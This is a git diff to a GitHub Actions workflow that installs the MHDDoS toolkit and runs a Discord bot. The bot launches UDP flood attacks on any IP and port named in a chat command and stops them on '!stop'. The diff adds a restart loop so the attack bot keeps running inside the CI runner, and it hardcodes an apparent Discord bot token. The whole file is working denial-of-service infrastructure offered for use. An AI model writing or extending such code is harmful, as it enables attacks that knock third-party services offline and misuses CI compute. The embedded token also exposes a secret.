@@ -41,7 +41,7 @@ jobs:
           cd MHDDoS
           python -m pip install -r requirements.txt
 
-      - name: Create Bot Script
+      - name: Start Bot and Keep Alive
         shell: pwsh
         run: |
           $code = @'
@@ -49,6 +49,7 @@ jobs:
           import asyncio
           import subprocess
           import os
+          import time
 
           TOKEN = 'MTQzMDYyNzc2OTMxNzk4NjM4NQ.G_VIV5.otgPTwQ92MRF-gzXUhVtcT4WOLCwggjAeD0nuk'
 
@@ -60,7 +61,8 @@ jobs:
 
           @client.event
           async def on_ready():
-              print(f'Logged in as {client.user}')
+              print(f'Bot online: {client.user}')
+              print('Bot is ready and listening...')
 
           @client.event
           async def on_message(message):
@@ -75,40 +77,40 @@ jobs:
                   
                   ip = parts[1]
                   port = parts[2]
-                  time = parts[3]
+                  time_duration = parts[3]
                   
-                  await message.channel.send(f'Starting attack on {ip}:{port} for {time}s')
+                  await message.channel.send(f'Starting attack on {ip}:{port} for {time_duration}s')
                   
                   try:
                       mhddos_path = os.path.join(os.environ['USERPROFILE'], 'MHDDoS')
                       proc = await asyncio.create_subprocess_shell(
-                          f'python start.py UDP {ip}:{port} 5 {time}',
+                          f'python start.py UDP {ip}:{port} 5 {time_duration}',
                           cwd=mhddos_path,
                           stdout=asyncio.subprocess.PIPE,
                           stderr=asyncio.subprocess.PIPE
                       )
                       processes.append(proc)
-                      await message.channel.send('Attack started!')
+                      await message.channel.send('Attack started successfully!')
                   except Exception as e:
                       await message.channel.send(f'Error: {str(e)}')
               
               elif message.content == '!stop':
                   for proc in processes:
-                      proc.terminate()
+                      try:
+                          proc.terminate()
+                      except:
+                          pass
                   processes.clear()
                   await message.channel.send('All attacks stopped!')
 
-          client.run(TOKEN)
+          print('Starting bot...')
+          while True:
+              try:
+                  client.run(TOKEN)
+              except Exception as e:
+                  print(f'Bot error: {e}')
+                  print('Restarting in 5 seconds...')
+                  time.sleep(5)
           '@
           $code | Out-File -FilePath "$env:USERPROFILE\bot.py" -Encoding utf8
-
-      - name: Start Bot
-        run: |
-          Start-Process python -ArgumentList "$env:USERPROFILE\bot.py" -WindowStyle Hidden
-
-      - name: Keep Alive
-        run: |
-          while($true) {
-            Write-Host "Server is running..."
-            Start-Sleep -Seconds 60
-          }
+          python "$env:USERPROFILE\bot.py"
